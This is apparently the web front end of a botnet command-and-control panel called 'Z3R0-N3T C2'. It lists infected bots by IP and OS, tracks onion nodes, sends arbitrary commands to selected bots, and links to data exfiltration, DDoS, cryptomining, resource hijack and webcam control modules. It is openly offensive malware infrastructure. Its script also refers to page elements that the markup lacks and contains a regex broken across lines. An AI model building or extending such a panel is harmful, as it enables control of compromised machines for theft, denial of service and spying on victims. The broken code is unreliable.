<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Z3R0-N3T C2</title>
    <style>
        body {
            background-color: #1a1a1a;
            color: #bf00ff;
            font-family: "Courier New", Courier, monospace;
            margin: 0;
            padding: 20px;
        }
        h1, h2 {
            text-align: center;
            text-shadow: 0 0 5px #bf00ff;
        }
        .container {
            display: flex;
            flex-direction: column;
            gap: 20px;
        }
        .panel {
            background-color: #2a2a2a;
            border: 1px solid #bf00ff;
            border-radius: 5px;
            padding: 15px;
        }
        #bots, #output {
            height: 200px;
            overflow-y: scroll;
            border: 1px solid #bf00ff;
            padding: 10px;
            background-color: #111;
        }
        #bots ul {
            list-style-type: none;
            padding: 0;
            margin: 0;
        }
        #bots li {
            cursor: pointer;
            padding: 5px;
            display: flex;
            align-items: center;
        }
        #bots li:hover, #bots li.selected {
            background-color: #bf00ff;
            color: #1a1a1a;
        }
        .status-circle {
            width: 10px;
            height: 10px;
            border-radius: 50%;
            margin-right: 10px;
        }
        .status-green {
            background-color: #00ff00;
        }
        .status-yellow {
            background-color: #ffff00;
        }
        .status-red {
            background-color: #ff0000;
        }
        input[type="text"], button {
            background-color: #333;
            color: #bf00ff;
            border: 1px solid #bf00ff;
            padding: 8px;
            width: calc(100% - 18px);
        }
        button {
            cursor: pointer;
            width: 100%;
        }
        button:hover {
            background-color: #bf00ff;
            color: #1a1a1a;
        }
    </style>
</head>
<body>

    <h1>Botnet Command & Control</h1>

    <div class="container">
        <div class="panel">
            <h2>Bots</h2>
            <div id="bots">
                <ul>
                    <!-- Bots will be dynamically populated here -->
                </ul>
            </div>
        </div>

        <div class="panel">
            <h2>Modules</h2>
            <button onclick="window.location.href='/DATA_EXFILTRATION_MOD'">Data Exfiltration</button>
            <button onclick="window.location.href='/DDOS_MOD'">DDoS</button>
            <button onclick="window.location.href='/GEOLOCATION_MOD'">Geolocation</button>
            <button onclick="window.location.href='/HIJACK_MOD'">Resource Hijack</button>
            <button onclick="window.location.href='/MINER_MOD'">Miner</button>
            <button onclick="window.location.href='/NET_SCAN_MOD'">Network Scan</button>
            <button onclick="window.location.href='/WEBCAM_MOD'">Webcam Control</button>
            <button onclick="window.location.href='/RESOURCE'">Resource</button>
        </div>

        <div class="panel">
            <h2>Command</h2>
            <input type="text" id="command" placeholder="Enter command for selected bot(s)">
            <br><br>
            <button onclick="sendCommand()">Send Command</button>
        </div>

        <div class="panel">
            <h2>Output</h2>
            <div id="output">
                <!-- Command output will be displayed here -->
            </div>
        </div>
    </div>

    <script>
        const nodesList = document.getElementById('nodes').getElementsByTagName('ul')[0];
        const commandInput = document.getElementById('command');
        const outputDiv = document.getElementById('output');
        const botsTableBody = document.querySelector('#bots-table tbody');
        const selectAllButton = document.getElementById('select-all');

        let selectedBots = [];
        let botsSnapshot = [];

        if (selectAllButton) {
            selectAllButton.addEventListener('click', toggleSelectAll);
        }

        function parseCsv(text) {
            const lines = text.trim().split(/
?
/);
            if (!lines.length) {
                return [];
            }
            const headers = lines[0].split(',').map(h => h.trim());
            return lines.slice(1).filter(Boolean).map(line => {
                const cols = line.split(',');
                const row = {};
                headers.forEach((header, idx) => {
                    row[header] = (cols[idx] || '').trim();
                });
                return row;
            });
        }

        function normalizeBots(payload) {
            if (Array.isArray(payload)) {
                return payload;
            }
            if (payload && typeof payload === 'object') {
                return Object.keys(payload).map(id => ({ bot_id: id, ...(payload[id] || {}) }));
            }
            return [];
        }

        function updateBotList(bots) {
            botsSnapshot = normalizeBots(bots);
            const visibleIds = botsSnapshot.map(bot => bot.bot_id);
            selectedBots = selectedBots.filter(id => visibleIds.includes(id));

            botsTableBody.innerHTML = '';

            botsSnapshot.forEach(bot => {
                // Normalize C2 color statuses to textual labels where necessary
                let rawStatus = String(bot.status || '').toLowerCase();
                let statusLabel = (bot.status || '').toUpperCase();
                if (rawStatus === 'green') statusLabel = 'ONLINE';
                else if (rawStatus === 'yellow') statusLabel = 'STANDBY';
                else if (rawStatus === 'red') statusLabel = 'OFFLINE';
                if (!statusLabel) {
                    statusLabel = 'OFFLINE';
                }
                const indicatorSlug = statusLabel === 'ONLINE' ? 'online' : (statusLabel === 'STANDBY' ? 'standby' : 'offline');
                const lastTimestamp = parseFloat(bot.last_seen_timestamp || bot.timestamp || '0') || undefined;
                const firstTimestamp = parseFloat(bot.first_seen_timestamp || '0') || lastTimestamp;

                const row = document.createElement('tr');
                row.dataset.botId = bot.bot_id;
                if (selectedBots.includes(bot.bot_id)) {
                    row.classList.add('selected');
                }

                const selectCell = document.createElement('td');
                const selectBtn = document.createElement('button');
                selectBtn.className = 'row-select-btn';
                const isSelected = selectedBots.includes(bot.bot_id);
                selectBtn.textContent = isSelected ? '✓' : '+ ';
                selectBtn.title = isSelected ? 'Deselect bot' : 'Select bot';
                selectBtn.addEventListener('click', event => {
                    event.stopPropagation();
                    toggleBotSelection(bot.bot_id);
                });
                selectCell.appendChild(selectBtn);
                row.appendChild(selectCell);

                const idCell = document.createElement('td');
                idCell.textContent = bot.bot_id;
                row.appendChild(idCell);

                const hostCell = document.createElement('td');
                hostCell.textContent = bot.hostname || bot.host || '—';
                row.appendChild(hostCell);

                const osCell = document.createElement('td');
                osCell.textContent = bot.os || '—';
                row.appendChild(osCell);

                const ipCell = document.createElement('td');
                ipCell.textContent = bot.ip || '—';
                row.appendChild(ipCell);

                const statusCell = document.createElement('td');
                const statusPill = document.createElement('span');
                statusPill.className = `status-pill status-${indicatorSlug}`;
                statusPill.textContent = statusLabel;
                statusCell.appendChild(statusPill);
                row.appendChild(statusCell);

                const lastSeenCell = document.createElement('td');
                const lastPrimary = document.createElement('span');
                if (lastTimestamp) {
                    lastPrimary.textContent = new Date(lastTimestamp * 1000).toLocaleString();
                } else if (bot.last_seen && bot.last_seen !== 'INIT') {
                    lastPrimary.textContent = bot.last_seen;
                } else {
                    lastPrimary.textContent = 'INIT';
                }
                lastSeenCell.appendChild(lastPrimary);
                row.appendChild(lastSeenCell);

                const firstSeenCell = document.createElement('td');
                const firstPrimary = document.createElement('span');
                if (firstTimestamp) {
                    firstPrimary.textContent = new Date(firstTimestamp * 1000).toLocaleString();
                } else if (bot.first_seen && bot.first_seen !== 'INIT') {
                    firstPrimary.textContent = bot.first_seen;
                } else {
                    firstPrimary.textContent = 'INIT';
                }
                firstSeenCell.appendChild(firstPrimary);
                row.appendChild(firstSeenCell);

                row.addEventListener('click', () => toggleBotSelection(bot.bot_id));

                botsTableBody.appendChild(row);
            });

            updateSelectAllButton();
        }

        function updateNodeList(nodes) {
            nodesList.innerHTML = '';
            (nodes || []).forEach(node => {
                const li = document.createElement('li');
                const url = node.onion_url || node.onion || 'unknown';
                const status = node.status || 'unknown';
                li.textContent = `${url} (${status})`;
                nodesList.appendChild(li);
            });
        }

        function toggleBotSelection(botId) {
            const index = selectedBots.indexOf(botId);
            if (index > -1) {
                selectedBots.splice(index, 1);
            } else {
                selectedBots.push(botId);
            }
            updateBotList(botsSnapshot);
        }

        function toggleSelectAll() {
            if (!botsSnapshot.length) {
                return;
            }
            if (selectedBots.length === botsSnapshot.length) {
                selectedBots = [];
            } else {
                selectedBots = botsSnapshot.map(bot => bot.bot_id);
            }
            updateBotList(botsSnapshot);
        }

        function updateSelectAllButton() {
            if (!selectAllButton) {
                return;
            }
            if (!botsSnapshot.length) {
                selectAllButton.textContent = 'Select All';
                selectAllButton.disabled = true;
                return;
            }
            selectAllButton.disabled = false;
            selectAllButton.textContent = selectedBots.length === botsSnapshot.length ? 'Clear All' : 'Select All';
        }

        function sendCommand() {
            const command = commandInput.value;
            if (!command) {
                alert('Please enter a command.');
                return;
            }
            if (!selectedBots.length) {
                alert('Please select at least one bot.');
                return;
            }

            const message = {
                targets: selectedBots,
                command,
            };

            fetch('/api/c2/command', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(message),
            })
                .then(response => response.json())
                .then(data => {
                    logToOutput(`Command sent to ${selectedBots.join(', ')}. Response: ${JSON.stringify(data)}`);
                })
                .catch(error => {
                    console.error('Error sending command:', error);
                    logToOutput('Error sending command.');
                });

            commandInput.value = '';
        }

        function logToOutput(message) {
            const p = document.createElement('p');
            p.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
            outputDiv.appendChild(p);
            outputDiv.scrollTop = outputDiv.scrollHeight;
        }

        function fetchBots() {
            // Prefer live JSON snapshot when available
            fetch('/api/bots')
                .then(resp => {
                    if (!resp.ok) throw new Error('api/bots unavailable');
                    return resp.json();
                })
                .then(data => {
                    updateBotList(data);
                })
                .catch(() => {
                    // Fallback to CSV registry for legacy servers
                    fetch('/registry.csv?_=' + Date.now())
                        .then(response => {
                            if (!response.ok) {
                                throw new Error('Failed to fetch registry.csv');
                            }
                            return response.text();
                        })
                        .then(text => {
                            const data = parseCsv(text);
                            updateBotList(data);
                        })
                        .catch(error => console.error('Error fetching bots:', error));
                });
        }

        function fetchNodes() {
            fetch('/api/nodes')
                .then(response => response.json())
                .then(data => updateNodeList(data))
                .catch(error => console.error('Error fetching nodes:', error));
        }

        setInterval(fetchBots, 5000);
        setInterval(fetchNodes, 10000);

        fetchBots();
        fetchNodes();
    </script>

</body>
</html>
